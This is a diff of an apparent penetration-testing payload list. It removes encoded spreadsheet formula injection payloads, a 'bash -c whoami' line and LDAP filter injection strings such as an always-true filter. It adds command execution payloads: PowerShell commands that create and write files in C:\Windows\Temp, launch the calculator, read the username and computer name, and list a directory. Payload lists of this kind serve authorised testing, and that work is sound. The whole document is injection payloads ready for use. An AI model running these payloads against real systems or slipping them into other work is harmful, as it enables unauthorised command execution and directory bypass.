@@ -1,9 +1,17 @@
-cmd%25252C%25257C%252527%25252Fc+calc%252527%25252521A1
-BaSh -c "whoami"
-=0x636D64|'/c calc'!A1
+PAYLOAD A - File Creation (Proof of Execution):
+POWERSHELL "NEW-ITEM -PATH C:\WINDOWS\TEMP\EXPLOITED.TXT -ITEMTYPE FILE"
 
-PAYLOAD 11.1 - Basic LDAP Injection: =)(objectClass=
+PAYLOAD B - Write to File:
+POWERSHELL "ADD-CONTENT -PATH C:\WINDOWS\TEMP\DATA.TXT -VALUE 'HACKED BY PENTEST'"
 
-PAYLOAD 11.2 - Always True: =)(|(uid=))(&(uid=*
+PAYLOAD C - Run Calculator:
+CMD /C CALC.EXE
 
-PAYLOAD 11.3 - Comment in LDAP: =)(uid=administrator;
+PAYLOAD D - Get Username:
+POWERSHELL "[ENVIRONMENT]::USERNAME"
+
+PAYLOAD E - Get Computer Name:
+POWERSHELL "[ENVIRONMENT]::COMPUTERNAME"
+
+PAYLOAD F - List Files:
+CMD /C DIR C:\WINDOWS\TEMP\
